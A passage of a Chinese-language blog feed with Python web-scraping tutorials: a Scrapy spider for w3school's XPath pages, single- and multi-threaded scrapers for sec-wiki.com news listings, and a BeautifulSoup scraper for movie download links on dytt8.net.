+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import json</div><div class="line">import codecs</div><div class="line"></div><div class="line">class W3SchoolPipeline(object):</div><div class="line">    def __init__(self):</div><div class="line">      self.file = codecs.open(&apos;w3school_utf8.json&apos;, &apos;wb&apos;, encoding=&apos;utf-8&apos;)</div><div class="line"></div><div class="line">    def process_item(self, item, spider):</div><div class="line">        line = json.dumps(dict(item)) + &apos;\n&apos;</div><div class="line">        # print line</div><div class="line">        self.file.write(line.decode(&quot;unicode_escape&quot;))</div><div class="line">        return item</div></pre></td></tr></table></figure>
+<p>其中的process_item方法是必须调用的用来处理item，并且返回值必须为Item类的对象，或者是抛出DropItem异常。并且上述方法将得到的item实现解码，以便正常显示中文，最终保存到json文件中。<br>这里利用到了codecs库，详情可参考<a href="http://blog.csdn.net/suofiya2008/article/details/5579413" target="_blank" rel="external">http://blog.csdn.net/suofiya2008/article/details/5579413</a></p>
+<p>在编写完pipeline后，为了能够启动它，必须将其加入到ITEM_PIPLINES配置中，即在settings.py中加入下面一句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ITEM_PIPELINES = &#123;</div><div class="line">    &apos;w3school.pipelines.W3SchoolPipeline&apos;: 300,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>其实上面这个配置在settings.py中已经有了，只不过是注释起来了，你可以将其打开然后将其原来的SomePipiline改成自己定义的就行了。</p>
+<h4 id="2-编写爬虫"><a href="#2-编写爬虫" class="headerlink" title="2.编写爬虫"></a>2.编写爬虫</h4><p>接下来是编写我们的爬虫文件，在spider文件夹下创建一个新的py文件，我们这里起名为w3school_spider.py<br>然后下面是这个文件的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">from scrapy.spiders import Spider</div><div class="line">from scrapy.selector import Selector</div><div class="line">import logging</div><div class="line">from w3school.items import W3SchoolItem</div><div class="line"></div><div class="line">class W3schoolSpider(Spider):</div><div class="line">    name = &quot;w3school&quot;</div><div class="line">    allowed_domains = [&quot;w3school.com.cn&quot;]</div><div class="line">    start_urls = [</div><div class="line">        &quot;http://www.w3school.com.cn/xpath/index.asp&quot;</div><div class="line">    ]</div><div class="line"></div><div class="line">    def parse(self, response):</div><div class="line">        sel = Selector(response)</div><div class="line">        sites = sel.xpath(&apos;//div[@id=&quot;course&quot;]/ul[1]/li&apos;)</div><div class="line">        items = []</div><div class="line"></div><div class="line">        for site in sites:</div><div class="line">            item = W3SchoolItem()</div><div class="line">            title = site.xpath(&apos;a/text()&apos;).extract()[0]</div><div class="line">            item[&apos;title&apos;] = title</div><div class="line">            link = site.xpath(&apos;a/@href&apos;).extract()[0]</div><div class="line">            item[&apos;link&apos;] = link</div><div class="line">            #这是输出文字的两种方法</div><div class="line">            desc = site.xpath(&apos;a/@title&apos;).extract()</div><div class="line">            item[&apos;desc&apos;] = [d.encode(&apos;utf-8&apos;) for d in desc]</div><div class="line">            items.append(item)</div><div class="line">        return items</div></pre></td></tr></table></figure>
+<ul>
+<li>此文件的名称可以自己定，但是有一点需要注意就是此文件不能和工程名一样，否则在<code>from 工程.items import item</code>是会提示错误无法找到<code>工程.items</code>，就是上面的<code>from w3school.items import W3SchoolItem</code></li>
+<li>属性name即spider唯一名字：开始爬虫时需要用到这个名字；start_url可以理解为爬取入口：从哪个url开始。</li>
+<li>parse()是对Spider类中parse的重写，在它里面定义了爬虫的规则。</li>
+<li>像我代码中注释所说的，从网上找的很多例子的log功能都是用<code>from scrapy import log</code>，由于版本问题它已经deprecated了并提示使用python的内建函数logging。其中的格式化输出请自行搜索。</li>
+<li>scrapy使用选择器Selector并通过XPath实现数据的提取。我这里爬取的就是w3school的xpaht教程的界面，不懂的可以直接在这学习了。</li>
+<li>allowed_domains中规定爬虫只允许分析的url,如果不在这个列表中就不考虑</li>
+</ul>
+<h4 id="3-运行"><a href="#3-运行" class="headerlink" title="3.运行"></a>3.运行</h4><p>我们的爬虫已经编写完成了，下面开始爬取，进入到项目的目录中，然后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tenshine@tenshine:~/w3school$ scrapy crawl w3school</div></pre></td></tr></table></figure>
+<p>这是屏幕打印出了很多的log信息，在工程目录下同时产生了两个文件：w3school.log和w3school_utf8.json，结果都在json文件中，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;title&quot;: &quot;XPath 教程&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/index.asp&quot;, &quot;desc&quot;: [&quot;XPath 教程&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 简介&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_intro.asp&quot;, &quot;desc&quot;: [&quot;XPath 简介&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 节点&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_nodes.asp&quot;, &quot;desc&quot;: [&quot;XPath 节点&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 语法&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_syntax.asp&quot;, &quot;desc&quot;: [&quot;XPath 语法&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 轴&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_axes.asp&quot;, &quot;desc&quot;: [&quot;XPath Axes（轴）&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 运算符&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_operators.asp&quot;, &quot;desc&quot;: [&quot;XPath 运算符&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 实例&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_examples.asp&quot;, &quot;desc&quot;: [&quot;XPath 实例&quot;]&#125;</div><div class="line">&#123;&quot;title&quot;: &quot;XPath 总结&quot;, &quot;link&quot;: &quot;http://www.w3school.com.cn/xpath/xpath_summary.asp&quot;, &quot;desc&quot;: [&quot;您已经学习了 XPath，下一步呢？&quot;]&#125;</div></pre></td></tr></table></figure>
+<p>以上算是scrapy的最简单程序，可以看到什么不懂的就去查什么。</p>
+<p>#####此工程的github地址：<a href="https://github.com/lowkeynic4/crawl/tree/master/w3school" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/tree/master/w3school</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[利用正则和bs4爬取sec-wiki(多线程)]]></title>
+      <url>/2015/07/sec-wiki-mutiplethread/</url>
+      <content type="html"><![CDATA[<p>运行了上一篇单线程文件后你会觉得爬取的很慢，这是因为上一篇的过程是线性的,单线程：</p>
+<blockquote>
+<p><strong>拿到第一页url-&gt;爬取这页所有详情页链接-&gt;获取第一个详情页面代码-&gt;爬取信息-&gt;获取第二个详情页代码-&gt;获取信息….-&gt;拿到第二页url…</strong></p>
+</blockquote>
+<p>这样是顺序执行的，速度肯定慢，cpu利用率也低，所以想要速度快让任务并发进行就需要多线程了，多线程的执行逻辑如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">main函数--|--&gt;拿到第一页url-&gt;爬取详情页链接-&gt;获取第一个详情页面代码-&gt;爬取信息-&gt;写文件</div><div class="line">　　　　　　|--&gt;拿到第二页url-&gt;爬取详情页链接-&gt;获取第二个详情页面代码-&gt;爬取信息-&gt;写文件</div><div class="line">　　　　　　|--&gt;拿到第三页url-&gt;爬取详情页链接-&gt;获取第三个详情页面代码-&gt;爬取信息-&gt;写文件</div><div class="line">　　　　　　|--&gt;拿到第四页url-&gt;爬取详情页链接-&gt;获取第四个详情页面代码-&gt;爬取信息-&gt;写文件</div><div class="line">　　　　　　|--&gt;...</div><div class="line">　　　　　　|--&gt;拿到第n页url-&gt;爬取详情页链接-&gt;获取第n个详情页面代码-&gt;爬取信息-&gt;写文件</div></pre></td></tr></table></figure>
+<p>现在主函数改为如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    threads = []</div><div class="line">    newsPage = &quot;http://www.sec-wiki.com/news/index&quot;</div><div class="line">    homeCode = getOnePage(newsPage,0)</div><div class="line">    pattern = re.compile(r&apos;&lt;li class=&quot;last&quot;&gt;&lt;a href=&quot;/news/index\?News_page=(.*?)&quot;&gt;&apos;,re.S)</div><div class="line">    pageSum = re.findall(pattern,homeCode)</div><div class="line">    num = int(pageSum[0])</div><div class="line">    #num = 3   #因为有500多页，都爬取完时间太久，所以可以先爬3页看看效果</div><div class="line">    print pageSum</div><div class="line">    for i in range(num):#从0开始，需要+1</div><div class="line">        t = threading.Thread(target=getUrl,args=(i,))</div><div class="line">        threads.append(t)</div><div class="line">    for thread in threads:</div><div class="line">        thread.start()</div><div class="line">        sleep(1)</div><div class="line">        thread.join()</div></pre></td></tr></table></figure>
+<p>线程是根据获取的总共页数来启动的，每一个线程拿到了自己要去爬取哪一页用i来表示：<code>t = threading.Thread(target=getUrl,args=(i,))</code><br>然后加入到线程列表中：<code>threads.append(t)</code>
+　</p>
+<p>但是此时线程还没有启动需要用到接下来的for循环才能启动，并且调用线程的join函数。这个join函数的作用就是防止线程函数都启动起来后主线程会继续执行，因为主线程后面已经没有事情做了。如果让主线程继续走的话此程序的主线程就会退出，只要主线程退出，那么刚才所启动的所以子线程就会一同退出，这样我们的程序就停了，为了防止这件事情的发生，join函数就是干这件事的。
+　</p>
+<p>那为什么要加一个<code>sleep</code>睡眠1秒呢，这是因为估计网站服务器那边有限制，如果我请求的过于频繁就会ban掉我的ip，所以每起1个线程我就休息1秒钟，这样就解决了问题。
+　</p>
+<p>关于python的线程使用和python线程中join的用法请参考以下两个链接，简单明了：</p>
+<ul>
+<li>python 多线程：<a href="http://www.cnblogs.com/fnng/p/3670789.html" target="_blank" rel="external">http://www.cnblogs.com/fnng/p/3670789.html</a></li>
+<li>python join: <a href="http://www.jb51.net/article/54628.htm" target="_blank" rel="external">http://www.jb51.net/article/54628.htm</a></li>
+</ul>
+<p>这个多线程的版本还多干了一件事就是将所获取到的信息保存到文本文件中。在这里会遇到一件多线程中必须考虑的问题，就是锁的问题。<br>threading模块中给我们提供了两种类型的锁：<code>threading.Lock和threading.RLock</code>关于他们两个的区别请查看<a href="http://blog.sina.com.cn/s/blog_5dd2af0901012rad.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_5dd2af0901012rad.html</a><br>　<br>我们这里是利用<code>threading.RLock</code>，在了解了为什么要用锁之后，那么锁的用法非常简单，只有三句话，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">mylock=threading.RLock()</div><div class="line">mylock.acquire()</div><div class="line">具体内容</div><div class="line">mylock.release()</div></pre></td></tr></table></figure>
+<p>那我们这写文件为什么要用锁呢，我们的结果只保存到一个文件中，而每一个线程都要去将自己爬取到的结果保存到这个文件中，那么想象一下如果有两个进程同时打开了这个文件，进程1正在写文章标题，还没写完，这是进程2也将此文件打开了，我们这里打开文件的方式是追加方式，于是进程2就接着进程1还没写完的内容后面继续写，这样就造成了文件内容的错乱。于是锁的作用就体现出来了。</p>
+<p>我们定义了一个全局的锁，我要去写文件了，就看看锁是否有人占用，如果没人占用，我就拿到锁的所有权，然后去文件中尽情的写，别人在我写的时候也想去写，但是他也需要拿到锁的所有权才能继续，而所有权现在被我占用，他就得等着，等我写完了，我将锁的所有权交出来，别人就可以用了。所以在打开文件之前先acquire()一下，写完之后release()一下。</p>
+<p>其他内容和单线程的没有区别，这里不再赘述。</p>
+<p>此文件github地址：<a href="https://github.com/lowkeynic4/crawl/blob/master/secwiki/secwiki-thread.py" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/blob/master/secwiki/secwiki-thread.py</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[利用正则和bs4爬取sec-wiki.com(单线程)]]></title>
+      <url>/2015/07/sec-wiki-singlethread/</url>
+      <content type="html"><![CDATA[<p>首先来张图<br><img src="http://7xljat.com1.z0.glb.clouddn.com/1.jpg" alt=""></p>
+<h4 id="此网站的url为http-www-sec-wiki-com-news-index"><a href="#此网站的url为http-www-sec-wiki-com-news-index" class="headerlink" title="此网站的url为http://www.sec-wiki.com/news/index"></a>此网站的url为<a href="http://www.sec-wiki.com/news/index" target="_blank" rel="external">http://www.sec-wiki.com/news/index</a></h4><p>如图所示，首页上是资讯列表，点击标题后会跳到详情页，然后详情页也有一个和首页相同的标题，这个标题中包含着真正的文章地址，所以我们要做的就是先获取第一页中的标题链接，根据这个链接进入到详情页面，然后从详情页获取到标题的名称，连接，和时间即可。
+　</p>
+<p>但是还有一个问题，和电影天堂一样，在首页中可以看到，我们的电影或者资讯文章有很多，首页没有完全列出来，而是分页了，根据观察可以看出翻页的url很有规律：<code>http://www.sec-wiki.com/news/index?News_page=</code>，等号后面填写相应的页面数就可以跳转到对应页，但是这个页面不可能没有尽头，因为文章数是有限的，这件事情有两种解决方法，如下</p>
+<ul>
+<li>页面数一直增长，等到某一个页面我们没有获取到需要的东西时，说明已经到终点了，抛出异常</li>
+<li>找到这个最终的页面数，然后根据这个数字进行循环</li>
+</ul>
+<p>我们在这用的是第二种方法，因为在页面中查看&lt;末页&gt;的html代码可以看到这里边写的就是最终的页面数，我们用一个正则将这个数字匹配出来，正则表达式是这样的：<code>&lt;li class=&quot;last&quot;&gt;&lt;a href=&quot;/news/index\?News_page=(.*?)</code>所以我们只需要根据这个提取出来的数字利用for循环就可以了，主函数代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if __name__==&quot;__main__&quot;:</div><div class="line">    newsPage = &quot;http://www.sec-wiki.com/news/index&quot;</div><div class="line">    homeCode = getOnePage(newsPage,0)</div><div class="line">    pattern = re.compile(r&apos;&lt;li class=&quot;last&quot;&gt;&lt;a href=&quot;/news/index\?News_page=(.*?)&quot;&gt;&apos;,re.S)</div><div class="line">    pageSum = re.findall(pattern,homeCode)</div><div class="line">    print pageSum #这就是打印出最终页的数字</div><div class="line">    for i in range(int(pageSum[0])):#i从0开始，需要+1</div><div class="line">        childCode = getOnePage(&apos;http://www.sec-wiki.com/news/index?News_page=&apos;,i+1)</div><div class="line">        infos = getUrl(childCode)</div><div class="line">        for info in infos:</div><div class="line">            print info[&apos;time&apos;]+&apos;%-100s&apos;%(info[&apos;title&apos;])+&apos;%-100s&apos;%(info[&apos;url&apos;])</div></pre></td></tr></table></figure>
+<p>我们知道你要爬取任何信息的必要步骤都是要将目标url的代码先获取回来，所以将这个功能封装成一个函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def getOnePage(url,index=0):</div><div class="line">    try:</div><div class="line">        user_agent = &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;</div><div class="line">        headers = &#123; &apos;User-Agent&apos; : user_agent &#125;</div><div class="line">        if index==0:</div><div class="line">            pass</div><div class="line">        else:</div><div class="line">            url = url+str(index)</div><div class="line">        request = urllib2.Request(url,headers = headers)</div><div class="line">        response = urllib2.urlopen(request)</div><div class="line">        pageCode = response.read().decode(&apos;utf-8&apos;)</div><div class="line">        return pageCode</div><div class="line">    except urllib2.URLError,e:</div><div class="line">        if hasattr(e,&quot;reason&quot;):</div><div class="line">            print u&quot;错误&quot;,e.reason</div><div class="line">            return None</div></pre></td></tr></table></figure>
+<p>这里getOnePage有两个参数，一个是url，另一个是页面数，如果你要获取每一个页面的代码时第二个参数是有用的，但是如果我想根据咨询列表中获得的url进入详情页时，我只需传入一个详情页的url即可，这就用到了默认参数，将这个值设定为0,然后在函数中，判断这个值是否为0，如果为0则是想获得详情页代码，直接请求传入的url即可；如果不为0，则要将url和页面数拼凑成最终的页面url，然后再请求这个url。</p>
+<p>现在铺垫都已经做完了，接下来完成主要的事情，就是提取信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">def getUrl(childCode):</div><div class="line">    try:</div><div class="line">        infoList = []</div><div class="line">        soup = bs4.BeautifulSoup(childCode)</div><div class="line">        table = soup.find(&apos;table&apos;,attrs=&#123;&apos;class&apos;:&apos;items table&apos;&#125;)</div><div class="line">        trs = table.findAll(&apos;tr&apos;)</div><div class="line"></div><div class="line">        pattern = re.compile(r&apos;&lt;td&gt;.*?&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;(.*?)&quot; target=&quot;_blank&quot;&gt;.*?&lt;/a&gt;&lt;/td&gt;&apos;,re.S)</div><div class="line">        for tr in trs:</div><div class="line">            infoDic = &#123;&#125;</div><div class="line">            urls = re.findall(pattern,str(tr))</div><div class="line">            for url in urls:</div><div class="line">                childUrl =&apos;http://www.sec-wiki.com&apos;+url</div><div class="line">                sonCode = getOnePage(childUrl)</div><div class="line">                childPattern=re.compile(&apos;&lt;strong&gt;(.*?)&lt;/strong&gt;.*?&lt;a href=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&apos;,re.S)</div><div class="line">                items = re.findall(childPattern,sonCode)</div><div class="line">                for item in items:</div><div class="line">                    infoDic[&apos;time&apos;] = item[0]</div><div class="line">                    infoDic[&apos;url&apos;] = item[1]</div><div class="line">                    infoDic[&apos;title&apos;] = item[2]</div><div class="line">                    infoList.append(infoDic)</div><div class="line">        return infoList</div><div class="line">    finally:</div><div class="line">        pass</div></pre></td></tr></table></figure>
+<p>我们首先需要先从页面的代码中提取出来详情页的url，根据观察页面代码可以知道，所有的详情页的url都是在<tr>标签中，所以我们先用bs4将页面中所有的</tr><tr>标签获取出来，然后循环这个</tr><tr>列表，利用正则从每一个</tr><tr>标签中将详情页的url提取出来。<br>　<br>经过观察每一个详情页的url，发现详情页的url只有路径，没有域名，所以这一步还需要将详情页路径和域名拼凑起来，就有了这一句代码<code>childUrl =&#39;http://www.sec-wiki.com&#39;+url</code>。</tr></p>
+<p>有了详情页的url后，我们只需利用getOnePage()这个函数去获取每一个详情页的代码，然后提取最终需要的信息。
+　</p>
+<p>这里也是用了一个正则表达式<code>&lt;strong&gt;(.*?)&lt;/strong&gt;.*?&lt;a href=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;</code><br>解释一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&gt;懒惰模式，后边多一个？表示，必须跟在*或者+后边用。</div><div class="line"></div><div class="line">&gt; 如要匹配的字符串为：`&lt;img src=&quot;test.jpg&quot; width=&quot;60px&quot; height=&quot;80px&quot;/&gt;`</div><div class="line">如果用正则匹配src中内容非懒惰模式匹配src=&quot;.*&quot;</div><div class="line"></div><div class="line">&gt; 匹配结果是：src=&quot;test.jpg&quot; width=&quot;60px&quot; height=&quot;80px&quot;</div><div class="line">意思是从=&quot;往后匹配，直到最后一个&quot;匹配结束</div><div class="line"></div><div class="line">&gt;懒惰模式正则：</div><div class="line">src=&quot;.*?&quot;</div><div class="line">结果：src=&quot;test.jpg&quot;</div><div class="line">因为匹配到第一个&quot;就结束了一次匹配。不会继续向后匹配。因为他懒惰嘛。</div><div class="line"></div><div class="line"></div><div class="line">我写出这个正则表达式其实就是从页面中将包含我要的信息的源码先拷贝到编辑器中，然后观察哪些东西在不同页面中是变的，哪些是不变的，将会改变的东西就用`.*?`代替，它的含义就是遇到`?`后面的字符马上就停下来。那为什么要给他们加上括号呢，这样`(.*?)`是设置分组，当你用`item=re.findall`后，你就可以用item[下标]来访问第几个括号中的内容，下标从0开始。于是就有了这样的代码</div></pre></td></tr></table></figure></p>
+<p> childPattern=re.compile(‘<strong>(.<em>?)</em></strong>.?<a href="(.*?)">(.*?)</a>‘,re.S)<br>items = re.findall(childPattern,sonCode)<br>                for item in items:<br>                    infoDic[‘time’] = item[0]<br>                    infoDic[‘url’] = item[1]<br>                    infoDic[‘title’] = item[2]<br>```</p>
+<p>上面三个<code>(.*?)</code>分别是文章时间、文章url、文章标题。于是对应着item[0]、item[1]、item[2]。<br>这样我们需要的信息就提取出来了，将每一个信息的字典添加到一个列表中返回给主函数就大功告成了。</p>
+<p>此文件的github地址：<a href="https://github.com/lowkeynic4/crawl/blob/master/secwiki/secwiki.py" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/blob/master/secwiki/secwiki.py</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[利用bs4爬取电影天堂电影下载地址]]></title>
+      <url>/2015/07/crawl-dytt8/</url>
+      <content type="html"><![CDATA[<p>首先来张图：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20150906160242.jpg" alt=""></p>
+<p>将就看吧，我都有点不好意思，但至少表现出来要表达的意思了，我们最终要获得的信息不是在第一个页面中，而是从第一个页面中进入第二个页面，需要的信息在第二个页面中，虽然电影列表有很多页，但是现阶段都不考虑只获取第一页中的所有电影的下载连接。<br>这个爬虫分三步</p>
+<ul>
+<li>先从第一页中将所有第二页的url取出来，存到列表中</li>
+<li>循环第二页地址的列表，将这个url与网站域名拼凑成真正地址，然后获取第二页的代码</li>
+<li>从第二页代码中获取最终需要的下载地址存储到一个字典中</li>
+</ul>
+<p>首先利用bs4从第一页中获取所有第二页的url，并存储到一个列表中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">film_list = []</div><div class="line">headers = (&apos;User-Agent&apos;, &apos;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36&apos;)</div><div class="line"># 创建OpenerDirector对象并打开网页</div><div class="line">opener = urllib2.build_opener()</div><div class="line">opener.addheaders = [headers]</div><div class="line">content = opener.open(url).read()</div><div class="line">encoding = chardet.detect(content)[&apos;encoding&apos;]</div><div class="line">content = content.decode(encoding, &apos;ignore&apos;)</div><div class="line"></div><div class="line"># 创建网页的BeautifulSoup对象</div><div class="line">soup = bs4.BeautifulSoup(content)</div><div class="line">films_set = soup.findAll(&apos;a&apos;, class_=&apos;ulink&apos;)  #获取所有class为ulink的a标签</div></pre></td></tr></table></figure>
+<p>上面的encoding = chardet.detect(content)[‘encoding’]是探测网页编码比如utf-8，gbk</p>
+<p>因为python的内部编码为unicode，所以需要将获取到的内容转换为unicode，上句话已经获得到了网页的编码，下面这句话就是转换了，content = content.decode(encoding, ‘ignore’)这句代码为什么要加ignore，那我下面就要引用了</p>
+<blockquote>
+<p>比如，若要将某个String对象s从gbk转换为unicode，可以如下操作<br>s.decode(‘gbk’)<br>可是，在实际开发中，我发现，这种办法经常会出现异常：<br>UnicodeDecodeError: ‘gbk’ codec can’t decode bytes in position 30664-30665: illegal multibyte sequence</p>
+<p>这是因为遇到了非法字符——尤其是在某些用C/C++编写的程序中，全角空格往往有多种不同的实现方式，比如\xa3\xa0，或者\xa4\x57，这些 字符，看起来都是全角空格，但它们并不是“合法”的全角空格（真正的全角空格是\xa1\xa1），因此在转码的过程中出现了异常。</p>
+<p>这样的问题很让人头疼，因为只要字符串中出现了一个非法字符，整个字符串——有时候，就是整篇文章——就都无法转码。</p>
+<p>解决办法：s.decode(‘gbk’, ‘ignore’)</p>
+<p>因为decode的函数原型是decode([encoding], [errors=’strict’])，可以用第二个参数控制错误处理的策略，默认的参数就是strict，代表遇到非法字符时抛出异常；<br>如果设置为ignore，则会忽略非法字符；<br>如果设置为replace，则会用?取代非法字符；<br>如果设置为xmlcharrefreplace，则使用XML的字符引用。</p>
+</blockquote>
+<p>经过上面的处理，所有第二页的url就存储到了films_set列表中了，下一步需要循环这个列表将所有的url与域名拼凑起来形成最终的url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">for film in films_set:</div><div class="line">       film_dic = &#123;&#125;</div><div class="line">       # 提取地址，并与主域名拼凑</div><div class="line">       film_href = &quot;http://www.dytt8.net&quot; + film[&apos;href&apos;]</div></pre></td></tr></table></figure>
+<p>因为最终第二页的url已经拿到，那么我们接下来就去获取第二页的源码，分析然后拿到电影下载地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># 打开地址，获取第二页代码</div><div class="line">        film_content = urllib2.urlopen(film_href).read()</div><div class="line">        encoding = chardet.detect(film_content)[&apos;encoding&apos;]</div><div class="line">        film_content = film_content.decode(encoding, &apos;ignore&apos;)</div><div class="line">        # 获取HTML文档的BeautifulSoup对象</div><div class="line">        film_soup = bs4.BeautifulSoup(film_content)</div><div class="line">        # 提取电影title及下载地址</div><div class="line">        title_all = film_soup.findAll(&apos;div&apos;, class_=&apos;title_all&apos;)</div><div class="line">        film_dic[&apos;film_title&apos;] = title_all[-1].h1.font.string</div><div class="line">        if film_dic[&apos;film_title&apos;]:</div><div class="line">            film_dic[&apos;download_url&apos;] = film_soup.findAll(&apos;td&apos;, style=&apos;WORD-WRAP: break-word&apos;)[0].a[&apos;href&apos;]</div><div class="line">            film_list.append(film_dic)</div><div class="line">        else:</div><div class="line">            break</div></pre></td></tr></table></figure>
+<p>在这又遇到个问题，就是在浏览器中用f12看到的下载地址的td标签和用代码获取出来的td标签内容不一样，也是经过询问才知道浏览器中看到的代码是经过js处理过的，我们用代码获得的是没有经过处理的，所以这就需要调试技巧了，先在获取存储下载地址的td标签下断点，然后分析这个td标签的内容，如下：</p>
